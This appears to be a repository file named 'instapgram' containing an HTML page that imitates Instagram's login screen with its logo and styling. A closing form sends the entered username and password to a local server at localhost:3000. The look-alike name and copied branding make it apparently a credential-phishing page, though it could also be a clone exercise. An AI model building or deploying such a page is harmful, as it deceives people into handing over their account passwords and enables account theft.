# instapgram
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 300px;
            text-align: center;
            border-radius: 8px;
        }
        .login-container img {
            width: 175px;
            margin-bottom: 20px;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            border: none;
            border-radius: 5px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin: 10px 0;
        }
        .login-container button:hover {
            background-color: #007bb5;
        }
        .login-container p {
            font-size: 12px;
            color: #8e8e8e;
        }
        .login-container a {
            color: #0095f6;
            text-decoration: none;
        }
        .signup {
            font-size: 14px;
            color: #8e8e8e;
            margin-top: 10px;
        }
        .signup a {
            color: #0095f6;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png?20160616034027" alt="Instagram Logo">
        <form>
            <input type="text" placeholder="Phone number, username, or email">
            <input type="password" placeholder="Password">
            <button type="submit">Log In</button>
        </form>
        <p><a href="#">Forgot password?</a></p>
    </div>
    <div class="signup">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
</body>
</html>

<form action="http://localhost:3000/login" method="post">
    <input type="text" name="username" placeholder="Phone number, username, or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
</form>
